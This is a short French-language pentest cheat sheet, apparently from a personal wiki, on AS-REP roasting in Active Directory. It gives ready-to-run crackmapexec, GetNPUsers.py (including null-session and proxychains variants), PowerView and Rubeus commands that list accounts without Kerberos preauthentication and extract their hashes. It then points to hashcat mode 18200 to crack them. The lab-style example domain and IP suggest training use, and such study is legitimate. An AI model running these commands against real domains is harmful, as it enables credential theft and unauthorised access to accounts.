---
public: true # set to true to make the article publishable
---

Obtention de la liste des utilisateurs n'ayant pas besoin de préauthentifaction.

Après obtention de cette liste, on pourra tenter de casser les mots de passe des utilisateurs.

## A distance

```powershell
crackmapexec ldap  $TARGET -u "$AD_USER" -p "$AD_PASSWORD" --asreproast asrep.txt

# NULL SESSION
GetNPUsers.py "$DOMAIN/" -dc-ip $TARGET -request -outputfile ASREProastables.txt

GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
proxychains -q GetNPUsers.py -hashes "$PASSWORD" -dc-ip "$DC" "$DOMAIN/$USER" -debug

# Powerview
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat /domain:<domain>

# A VERIFIER NE SEMBLE RIN AVOIR 0 FAIRE ICI
# kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 


```

Cassage du mot de passe avec hashcat  : mode 18200

[[docs/_Techniques/Mots de passe/Casser un mot de passe/Hashcat]]
